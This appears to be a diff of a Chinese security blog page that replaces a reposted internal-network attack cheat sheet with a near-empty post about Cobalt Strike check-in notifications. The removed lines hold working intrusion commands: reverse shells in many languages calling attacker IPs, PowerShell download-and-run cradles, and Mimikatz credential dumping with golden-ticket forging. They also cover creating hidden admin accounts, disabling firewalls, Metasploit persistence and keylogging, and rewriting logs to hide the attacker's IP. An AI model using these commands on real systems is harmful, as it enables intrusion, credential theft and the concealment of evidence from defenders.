@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="内网攻防脚本备忘录, Augu5t&#39;s Blog">
+    <meta name="keywords" content="自建server酱同款推送+CS上线提醒, Augu5t&#39;s Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>内网攻防脚本备忘录 | Augu5t&#39;s Blog</title>
+    <title>自建server酱同款推送+CS上线提醒 | Augu5t&#39;s Blog</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/Starry5ky/Starry5ky.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Starry5ky/Starry5ky.github.io/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/Starry5ky/Starry5ky.github.io/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/Starry5ky/Starry5ky.github.io/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">内网攻防脚本备忘录</h1>
+                    <h1 class="description center-align post-title">自建server酱同款推送+CS上线提醒</h1>
                 </div>
             </div>
         </div>
@@ -446,14 +446,23 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">-内网渗透</span>
+                            <a href="/tags/C2/">
+                                <span class="chip bg-color">C2</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/attack/" class="post-category">
+                                attack
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -462,7 +471,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-07
+                    2021-11-11
                 </div>
                 
 
@@ -471,14 +480,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.9k
+                    2
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    18 分
+                    1 分
                 </div>
                 
 
@@ -493,228 +502,7 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>转载：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/D7f3y1Wbb4418AZor9FKFg">https://mp.weixin.qq.com/s/D7f3y1Wbb4418AZor9FKFg</a></p>
-<p>nmap扫描实时存活的ip</p>
-<p>nmap 10.1.1.1 –open -oG scan-results; cat scan-results | grep “/open” | cut -d “ “ -f 2 &gt; exposed-services-ips</p>
-<p>常用命令</p>
-<p>ipsping          icmp连通性<br>nslookup <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> vps-ip dns连通性<br>dig @vps-ip <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a><br>curl vps:8080  http连通性<br>tracert<br>bitsadmin /transfer n <a target="_blank" rel="noopener" href="http://ip/xx.exe">http://ip/xx.exe</a> C:\windows\temp\x.exe一种上传文件 &gt;=2008<br>fuser -nv tcp 80 查看端口pid<br>rdesktop -u username ip linux连接win远程桌面 (有可能不成功)<br>where file win查找文件是否存在<br>找路径，Linux下使用命令find -name *.jsp来查找，Windows下，使用for /r c:\windows\temp\ %i in (file lsss.dmp) do @echo %i<br>netstat -apn | grep 8888   kill -9 PID   查看端口并kill<br>query user || qwinsta 查看当前在线用户<br>net user  查看本机用户<br>net user /domain 查看域用户<br>net view &amp; net group “domain computers” /domain 查看当前域计算机列表 第二个查的更多<br>net view /domain 查看有几个域<br>net view \dc   查看dc域内共享文件<br>net group /domain 查看域里面的组<br>net group “domain admins” /domain 查看域管<br>net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管<br>net group “domain controllers” /domain 域控<br>net time /domain<br>net config workstation   当前登录域 - 计算机名 - 用户名<br>net use \域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源<br>ipconfig<br>systeminfo 查看系统信息<br>tasklist /svc<br>tasklist /S ip /U domain\username /P /V 查看远程计算机tasklist<br>net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组<br>netstat -ano<br>nltest /dclist:xx  查看域控<br>dsquery<br>whoami /all 查看Mandatory Label uac级别和sid号<br>net sessoin 查看远程连接session(需要管理权限)<br>net share     共享目录<br>cmdkey /l   查看保存登陆凭证<br>echo %logonserver%  查看登陆域<br>spn –l administrator spn记录<br>set  环境变量<br>dsquery server - 查找目录中的 AD DC/LDS 实例<br>dsquery user - 查找目录中的用户<br>dsquery computer 查询所有计算机名称windows 2003<br>dir /s *.exe 查找指定目录下及子目录下没隐藏文件<br>arp -a 获取arp表</p>
-<p>脚本收集域信息</p>
-<p>使用ntdsxtract提取域信息</p>
-<p>git clone <a href="https://github.com/csababarta/ntdsxtract.git">https://github.com/csababarta/ntdsxtract.git</a>  python setup.py build &amp;&amp; python setup.py install</p>
-<p>使用被攻击主机CMD扫描存活ip</p>
-<p>for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr “TTL =”</p>
-<p>文件信息搜集</p>
-<p>ExifTool可读写及处理图像、视频及音频，例如Exif、IPTC、XMP、JFIF、GeoTIFF、ICC Profile。包括许多相机的制造商信息读取，如佳能，卡西欧，大疆，FLIR，三星等。</p>
-<p>exiftool ‐lang zh‐cn ‐a ‐u ‐g1 ./55e736d12f2eb9385716e 513d8628535e4dd6fdc.jpg</p>
-<p>Micropoor:”目标资产信息搜集的程度，决定渗透过程的复杂程度。目标主机信息搜集的深度，决定后渗透权限持续把控。渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。”<br>密码凭证获取</p>
-<p>提取 KRBTGT用户帐户的密码数据：</p>
-<p>Mimikatz “privilege::debug” “lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt”exit</p>
-<p>管理员用户帐户提取密码数据：</p>
-<p>Mimikatz “privilege::debug” “lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator” exit</p>
-<p>发现远程登录密码等密码 netpass.exe</p>
-<p>下载<a target="_blank" rel="noopener" href="https://www.nirsoft.net/utils/network_password_recovery.html">https://www.nirsoft.net/utils/network_password_recovery.html</a></p>
-<p>获取window vpn密码：</p>
-<p>mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit</p>
-<p>wifi密码：</p>
-<p>netsh wlan show profile 查处wifi名下一条命令用 netsh wlan show profile WiFi-name key=clear</p>
-<p>ie代理</p>
-<p>reg query “HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings” /v ProxyServer<br>reg query “HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet Settings”</p>
-<p>pac代理</p>
-<p>reg query “HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings” /v AutoConfigURL //引 t0stmail</p>
-<p>用户操作</p>
-<p>添加user</p>
-<p>net user admin1 admin1 /add &amp; net localgroup administrators admin1 /add</p>
-<p>如果不允许远程连接，修改注册表</p>
-<p>REG ADD “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br>REG ADD “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber /t REG_DWORD /d 0x00000d3d /f</p>
-<p>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:</p>
-<p>netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow</p>
-<p>关闭防火墙</p>
-<p>netsh firewall set opmode mode=disable</p>
-<p>添加隐藏账户</p>
-<p>开启sys权限cmd</p>
-<p>IEX(New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1&#39;);Invoke-TokenManipulation">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1&#39;);Invoke-TokenManipulation</a> -CreateProcess ‘cmd.exe’ -Username ‘nt authority\system’</p>
-<p>添加用户并隐藏</p>
-<p>IEX(New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1&#39;">https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1&#39;</a>)</p>
-<p>反弹shell和端口转发<br>Lnuix 反弹shell</p>
-<p>Bash</p>
-<p>bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1<br>bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2<br>exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&1;done<br>nc 192.168.31.174 8080 -t -e /bin/bash</p>
-<p>简单解释下：</p>
-<p>bash -i 打开一个交互的bash</p>
-<blockquote>
-<p>&amp;将标准错误输出重定向到标准输出</p>
-</blockquote>
-<p>/dev/tcp/x.x.x.x/port 意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口</p>
-<p>0&gt;&amp;1 <span style="color: rgb(51, 51, 51);"> 标准输入重定向到标准输出，实现你与反弹出来的shell的交互</span></p>
-<p>telnet反弹</p>
-<p>攻击者主机上打开两个终端分别执行监听：</p>
-<p>nc -lvvp 4444</p>
-<p>nc -lvvp 5555</p>
-<p>目标主机中执行：</p>
-<p>telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555</p>
-<p>监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip</p>
-<p>反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。</p>
-<p>另一个版本：</p>
-<p>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 4444 0/tmp/p</p>
-<p>Netcat without -e #1</p>
-<p>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f</p>
-<p>Netcat without -e #2</p>
-<p>nc localhost 443 | /bin/sh | nc localhost 444<br>telnet localhost 443 | /bin/sh | telnet localhost 444</p>
-<p>XTerm</p>
-<p>xterm -display 10.0.0.1:1</p>
-<p>JDWP RCE</p>
-<p>print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(“whoami”).getInputStream())).readLine())</p>
-<p>Working with Restricted Shells</p>
-<p>print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java</p>
-<p>常见脚本反弹：</p>
-<ol>
-<li>Python</li>
-</ol>
-<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“x.x.x.x”,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/bash”,”-i”]);’</p>
-<ol start="2">
-<li>Perl</li>
-</ol>
-<p>方法一：</p>
-<p>perl -e ‘use Socket;$i=”x.x.x.x”;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
-<p>方法二：</p>
-<p>perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”x.x.x.x:5555”);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’</p>
-<ol start="3">
-<li>Ruby</li>
-</ol>
-<p>方法一：</p>
-<p>ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“x.x.x.x”,”5555”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</p>
-<p>方法二：</p>
-<p>ruby -rsocket -e’f=TCPSocket.open(“x.x.x.x”,5555).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’</p>
-<ol start="4">
-<li>PHP</li>
-</ol>
-<p>php -r ‘$sock=fsockopen(“x.x.x.x”,5555);exec(“/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
-<ol start="5">
-<li><p>Java</p>
-<p> public class Revs {<br> /**</p>
-<ul>
-<li>@param args</li>
-<li>@throws Exception</li>
-<li>/<br>public static void main(String[] args) throws Exception {<br>   // TODO Auto-generated method stub<br>   Runtime r = Runtime.getRuntime();<br>   String cmd[]= {“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”};<br>   Process p = r.exec(cmd);<br>   p.waitFor();<br>}<br>}</li>
-</ul>
-</li>
-<li><p>Lua</p>
-</li>
-</ol>
-<p>lua -e “require(‘socket’);require(‘os’);t=socket.tcp();t:connect(‘x.x.x.x’,’5555’);os.execute(‘/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3’);”</p>
-<p>端口转发</p>
-<p>被攻击机 lcx.exe -slave 139.1.2.3 8888 10.48.128.25 3389<br>vps      lcx.exe –listen 8888 5555</p>
-<p>netsh win自带(只支持tcp)</p>
-<p>netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.1.101 connectport=8080</p>
-<p>将本地80转到192.168.1.101:8080端口</p>
-<p>netsh interface portproxy add v4tov4 listenaddress=1.1.1.101 listenport=8082 connectaddress=192.168.2.102 connectport=3389</p>
-<p>通过连接1.1.1.101的8082端口，相当连接1.1.1.101可访问的内网192.168.2.102的3389端口</p>
-<p>portfwd是一款强大的端口转发工具，支持TCP，UDP，支持IPV4–IPV6的转换转发。并且 内置于meterpreter。其中exe单版本源码如下：<a href="https://github.com/rssnsj/portfwd">https://github.com/rssnsj/portfwd</a></p>
-<p>攻击机执行</p>
-<p> portfwd add ‐l 33389 ‐r 192.168.1.119 ‐p 3389<br> portfwd add ‐l 30080 ‐r 192.168.1.119 ‐p 80</p>
-<p>分别访问攻击机33389，30080，既等价访问靶机3389，80<br>提权小结<br>常用exp：</p>
-<p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
-<p><a href="https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a></p>
-<p><a href="https://github.com/AusJock/Privilege-Escalation">https://github.com/AusJock/Privilege-Escalation</a></p>
-<p>linux提权辅助脚本</p>
-<p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p>
-<p>windows提权辅助脚本</p>
-<p><a href="https://github.com/Ethancck/Windows-Exploit-Suggester">https://github.com/Ethancck/Windows-Exploit-Suggester</a></p>
-<p>Msf相关</p>
-<p>linux相关payload：</p>
-<pre><code>linux/x86/meterpreter/reverse_tcp
-linux/x86/meterpreter/bind_tcp
-linux/x86/shell_bind_tcp
-linux/x86/shell_reverse_tcp
-linux/x64/shell/bind_tcp
-linux/x64/shell/reverse_tcp
-linux/x64/shell_bind_tcp
-linux/x64/shell_bind_tcp_random_port
-linux/x64/shell_reverse_tcp</code></pre>
-<p>windows相关payload:</p>
-<pre><code>windows/meterpreter/reverse_tcp
-windows/meterpreter/bind_tcp
-windows/meterpreter/reverse_hop_http
-windows/meterpreter/reverse_http
-windows/meterpreter/reverse_http_proxy_pstore
-windows/meterpreter/reverse_https
-windows/meterpreter/reverse_https_proxy
-windows/shell_reverse_tcp
-windows/shell_bind_tcp
-windows/x64/meterpreter/reverse_tcp
-windows/x64/meterpreter/bind_tcp
-windows/x64/shell_reverse_tcp
-windows/x64/shell_bind_tcp</code></pre>
-<p>目标服务器为64位用x64监听，反弹meterpreter用含有meterpreter的模块，反弹普通的shell（例如nc），shell_reverse_tcp模块监听</p>
-<p>例如msf:</p>
-<p>反弹shell  msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe<br>监听       windows/meterpreter/reverse_tcp</p>
-<p>反弹shell  nc -e cmd.exe ip port<br>监听       windows/shell_reverse_tcp</p>
-<p>meterpreter下上传 upload file 下载 download file<br>Msf进程注入(win2008 成功)</p>
-<p>meterpreter &gt; getuid<br>Server username: xxxx<br>meterpreter &gt; getpid<br>Current pid: 3456<br>meterpreter &gt; ps</p>
-<h1 id="Process-List"><a href="#Process-List" class="headerlink" title="Process List"></a>Process List</h1><p> PID   PPID  Name                       Arch  Session  User          Path</p>
-<hr>
-<p> 12000  676  shell.exe                  x86   2        xxx  C:\Users\xxx\Desktop\shell.exe<br> 676  1124  explorer.exe               x64   2        xxx  C:\Windows\explorer.exe</p>
-<p>meterpreter &gt; migrate 676<br>[*] Migrating from 12000 to 676…<br>[*] Migration completed successfully.</p>
-<p>Msf hash</p>
-<p>meterpreter &gt; run hashdump 需要sys权限 导出SAM</p>
-<p>meterpreter &gt; run post/windows/gather/smart_hashdump 需要sys权限</p>
-<p>getsystem存在uac，用msf bypass，但特征明显 meterpreter &gt; search bypassuac</p>
-<p>msf powerdump load mimikatz 不太好用</p>
-<p>Msf的持续后门</p>
-<p>Persistence: run persistence -h：用于创建启动项启动，会创建注册表，创建文件。（X86_Linux不支持此脚本）</p>
-<p>run persistence -U -i 10 -p 10390 -r free.ngrok.cc</p>
-<p>使用powershell执行也被监控而被360拦截</p>
-<p>meterpreter 的 run getgui -e 命令可以开启成 功。360会提示阻止</p>
-<p>Run metsvc -h ：用于创建服务，会创建meterpreter服务，并上传三个文件，使用-r参数可以卸载服务 ，被拦<br>Msf powershell</p>
-<p>meterpreter &gt; load powershell<br>meterpreter &gt; powershell_shell<br>PS &gt; IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;</a>);<br>Ps &gt; Invoke-Mimikatz -DumpCreds</p>
-<p>Msf Router</p>
-<p>2个或多个路由之间，没有配置相应的路由表，不能访问，获得一台机器shell session 添加路由，使msf可以在当前shell session下以被攻击机访问其他内网主机.</p>
-<p>meterpreter &gt; run get_local_subnets<br>    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.<br>    [!] Example: run post/multi/manage/autoroute OPTION=value […]<br>    Local subnet: 172.17.0.0/255.255.0.0<br>meterpreter &gt; run autoroute -s 172.17.0.0/16  添加路由<br>meterpreter &gt; run autoroute -p                查看路由<br>meterpreter &gt; run autoroute -d -s 172.17.0.0/16  删除</p>
-<p>键盘记录</p>
-<p>Msf键盘记录在windows不会创建新进程</p>
-<p>meterpreter &gt; keyscan_start meterpreter &gt; keyscan_dump meterpreter &gt; keyscan_stop</p>
-<p>Payload下载(windows)</p>
-<p>自windows7 以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自 动重试，在比较复杂的网络环境下，有着不错的性能。</p>
-<p>bitsadmin /rawreturn /transfer down “<a target="_blank" rel="noopener" href="http://vps/hello.php">http://vps/hello.php</a>“ G:\text\hello.php</p>
-<p>图片<br>mimikatz 和procdump 获得内存 hash</p>
-<p>如果服务器是64位，要把Mimikatz进程迁移到一个64位的程序进程中，才能查看64位系统密码明文。32位任意</p>
-<p>运行procdump.exe -accepteula -ma lsass.exe lsass.dmp(管理权限)后lsass.dmp放到mimikatz.exe同目录，运行以下命令</p>
-<p>mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”</p>
-<p>导出当前 内存 hash，需要免杀过av等</p>
-<p>mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”<br>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;</a>); Invoke-Mimikatz -DumpCreds”</p>
-<p>Windows Server 2012,部分Windows Server 2008默认无法使用mimikatz导出明文口令<br>黄金票据(维持权限)</p>
-<p>域用户sid</p>
-<p>whoami /all</p>
-<p>krbtgt hash</p>
-<p>mimikatz “lsadump::dcsync /domain:xx.com /user:krbtgt”</p>
-<p>域管 net group “domain admins” /domain 这里的是administrator</p>
-<p>mimikatz “kerberos::purge””kerberos::golden /admin:administrator /domain:xx.com /sid:S-1-5-….. /krbtgt:hash /ticket:Adminstrator.kiribi””kerberos::ptt Administrator.kiribi””kerberos::tgt”</p>
-<p>痕迹擦除</p>
-<p>在渗透中，想要不留痕迹的(当然这是很难的)，就要对自己的留下的痕迹进行擦除，这里以Lniux为例。<br>Linux痕迹清除</p>
-<p>Apache日志</p>
-<p>Apache主要的日志就是access.log``error_log，前者记录了HTTTP的访问记录，后者记录了服务器的错误日志。这些都可以在httpd.conf中找到。</p>
-<p>明文的Apache文件，通过正则表达式就可以搞定：</p>
-<p>sed –i ‘s/192.168.1.3/192.168.1.4/g’ /var/log/apache/ access.logsed –i ‘s/192.168.1.3/192.168.1.4/g’ /var/log/apache/error_log</p>
-<p>其中192.168.1.3是我们的IP，192.168.1.4使我们伪造的IP。在正则表达式中有特殊的含义，所以需要用“”来进行转义。</p>
-<p>MySQL日志文件</p>
-<p>log-error=/var/log/mysql/mysql_error.log #错误日志<br>log=/var/log/mysql/mysql.log#最好注释掉，会产生大量的日志，包括每一个执行的sql及环境变量的改变等等<br>log-bin=/var/log/mysql/mysql_bin.log # 用于备份恢复，或主从复制.这里不涉及。<br>log-slow-queries=/var/log/mysql/mysql_slow.log #慢查询日志<br>log-error=/var/log/mysql/mysqld.log<br>pid-file=/var/run/mysqld/mysqld.pid</p>
-<p>执行下述命令清除即可</p>
-<p>sed –i ‘s/192.168.1.3/192.168.1.4/g’/var/log/mysql/mysql_slow.log</p>
-<p>至于二进制日志文件，需要登录mysql client来修改删除，建议这种操作最先执行。</p>
-<p>php日志修改</p>
-<p>sed –i ‘s/192.168.1.3/192.168.1.4/g’/var/log/apache/php_error.log</p>
-<p>Linux日志清除</p>
-<p>这个比较多，记录的也比较复杂，测试环境是CentOS 6.3。只把和渗透有关的文件列出来，主要在/etc/logrotate.d/syslog中</p>
-<p>/var/log/maillog，该日志文件记录了每一个发送到系统或从系统发出的电子邮件的活动，它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统</p>
-<p>var/log/messages，该文件的格式是每一行包含日期、主机名、程序名，后面是包含PID或内核标识的方括号，一个冒号和一个空格</p>
-<p>/var/log/wtmp，该日志文件永久记录每个用户登录、注销及系统的启动，停机的事件。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前显示用户的登录记录，last也能根据用户，终端tty或时间显示相应的记录</p>
-<p>/var/run/utmp，该日志文件记录有关当前登录的每个用户的信息，因此这个文件会随着用户登录和注销系统而不断变化，它只保留当时联机的用户记录，不会为用户保留永久的记录。系统中需要查询当前用户状态的程序，如who、w、users、finger等就需要访问这个文件</p>
-<p>/var/log/xferlog，该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件。该文件会显示用户拷贝到服务器上的用来入侵服务器的恶意程序，以及该用户拷贝了哪些文件供他使用。</p>
-<p>bash_history，这是bash终端的命令记录，能够记录1000条最近执行过的命令（具体多少条可以配置），通过这个文件可以分析此前执行的命令来知道知否有入侵者，每一个用户的home目录里都有这么一个文件</p>
-<pre><code>安利的脚本：https://github.com/JonGates/jon](https://github.com/JonGates/jon</code></pre>
-<p>后言</p>
-<p>渗透是一门艺术，外练一口气，内练筋骨皮，时常巩固自己的知识体系，才能站在渗透的一线。最后向发扬分享精神的Micropoor致敬！贴出大佬的github：</p>
-<pre><code>https://github.com/Micropoor/Micro8</code></pre>
-
+                <h1 id="自建"><a href="#自建" class="headerlink" title="自建"></a>自建</h1>
             </div>
             <hr/>
 
@@ -729,7 +517,7 @@ windows/x64/shell_bind_tcp</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Augu5t</a>
+                    <a href="/about" rel="external nofollow noreferrer">augu5t</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -739,7 +527,7 @@ windows/x64/shell_bind_tcp</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://github.com/Starry5ky/starry5ky.github.io/2021/11/07/nei-wang-gong-fang-jiao-ben-bei-wang-lu/">https://github.com/Starry5ky/starry5ky.github.io/2021/11/07/nei-wang-gong-fang-jiao-ben-bei-wang-lu/</a>
+                    <a href="https://github.com/Starry5ky/starry5ky.github.io/2021/11/11/zi-jian-server-jiang-tong-kuan-tui-song-cs-shang-xian-ti-xing/">https://github.com/Starry5ky/starry5ky.github.io/2021/11/11/zi-jian-server-jiang-tong-kuan-tui-song-cs-shang-xian-ti-xing/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -752,7 +540,7 @@ windows/x64/shell_bind_tcp</code></pre>
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Augu5t</a>
+                    <a href="/about" target="_blank">augu5t</a>
                     !
                 </span>
             </div>
@@ -777,8 +565,8 @@ windows/x64/shell_bind_tcp</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">-内网渗透</span>
+                                <a href="/tags/C2/">
+                                    <span class="chip bg-color">C2</span>
                                 </a>
                             
                         </div>
@@ -951,13 +739,13 @@ windows/x64/shell_bind_tcp</code></pre>
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2021/11/07/nei-wang-gong-fang-jiao-ben-bei-wang-lu/">
+                <a href="/2021/11/11/zi-jian-server-jiang-tong-kuan-tui-song-cs-shang-xian-ti-xing/">
                     <div class="card-image">
                         
                         
-                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLP